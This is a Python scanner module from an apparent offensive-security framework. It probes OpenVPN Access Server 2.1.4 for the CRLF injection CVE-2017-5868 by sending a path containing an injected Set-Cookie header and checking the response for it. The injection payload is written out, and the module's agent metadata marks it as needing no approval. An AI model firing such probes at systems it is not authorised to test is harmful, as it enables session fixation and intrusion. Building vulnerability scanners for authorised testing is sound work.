#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CRLF injection vulnerability in the web interface in OpenVPN Access Server 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OpenVPN Access Server 2.1.4 - CRLF Injection Detection',
        'description': 'CRLF injection vulnerability in the web interface in OpenVPN Access Server 2.1.4 allows remote attackers to inject arbitrary HTTP headers and consequently conduct session fixation attacks and possibly HTTP response splitting attacks via "%0A" characters in the PATH_INFO to __session_start__/.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'openvpn', 'crlf', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.openwall.com/lists/oss-security/2017/05/23/13',
            'http://www.securitytracker.com/id/1038547',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-5868',
        ],
        'cve': 'CVE-2017-5868',
    }

    def run(self):
        r = self.http_request(method="GET", path='/__session_start__/%0aSet-Cookie:%20crlfinjection=1;', allow_redirects=False)
        if not r or r.status_code != 302:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_regexes = ('^Set-Cookie: crlfinjection=1;',)
        if (any(re.search(rx, headers, 0) for rx in header_regexes)):
            self.set_info(
                severity='medium',
                reason="OpenVPN Access Server 2.1.4 - CRLF Injection detected",
                path='/__session_start__/%0aSet-Cookie:%20crlfinjection=1;',
            )
            return True
        return False

